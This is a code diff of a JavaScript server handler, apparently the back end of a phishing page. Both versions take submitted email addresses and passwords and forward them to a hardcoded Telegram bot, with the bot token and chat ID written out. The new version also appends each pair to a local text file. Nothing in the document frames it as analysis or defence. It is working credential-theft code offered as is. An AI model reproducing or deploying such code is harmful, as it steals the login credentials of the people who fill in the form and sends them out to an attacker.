@@ -1,34 +1,41 @@
-import fetch from 'node-fetch';
+const fs = require('fs');
+const path = require('path');
 
 export default async function handler(req, res) {
-    if (req.method === 'POST') {
-        try {
-            const { email, password } = req.body;
+    // Ensure the request method is POST
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method not allowed' });
+    }
 
-            // Log received credentials
-            console.log('Received credentials:', { email, password });
+    try {
+        // Extract email and password from the request body
+        const { email, password } = req.body;
 
-            // Send credentials to Telegram bot
-            const telegramBotToken = '8159292912:AAGhCvnSWDPw545joH4Jz_N1sM94J425Zwo';
-            const chatId = '7587120060'; // Replace with your actual chat ID
-            const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
-            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
-            console.log('Sending message to Telegram:', telegramUrl);
+        // Save credentials to a file
+        const filePath = path.join(process.cwd(), 'username.txt');
+        const data = `Email: ${email}, Password: ${password}\n`;
+        fs.appendFileSync(filePath, data);
 
-            const response = await fetch(telegramUrl);
-            const result = await response.json();
-            console.log('Telegram API response:', result);
+        // Send credentials to Telegram bot
+        const telegramBotToken = '8159292912:AAGhCvnSWDPw545joH4Jz_N1sM94J425Zwo'; // New bot token
+        const chatId = '7587120060'; // Same chat ID
+        const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
+        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-            if (!response.ok) {
-                throw new Error(`Telegram API error: ${result.description}`);
-            }
+        // Send the message to Telegram
+        const response = await fetch(telegramUrl);
+        const result = await response.json();
 
-            res.status(200).json({ success: true });
-        } catch (error) {
-            console.error('Error in submit.js:', error.message);
-            res.status(500).json({ error: 'Failed to process request' });
+        // Check if the Telegram API request was successful
+        if (!response.ok) {
+            throw new Error(`Telegram API error: ${result.description}`);
         }
-    } else {
-        res.status(405).json({ error: 'Method not allowed' });
+
+        // Respond with success
+        return res.status(200).json({ success: true });
+    } catch (error) {
+        // Log the error and respond with an error message
+        console.error('Error in submit.js:', error.message);
+        return res.status(500).json({ error: 'Failed to process request' });
     }
 }
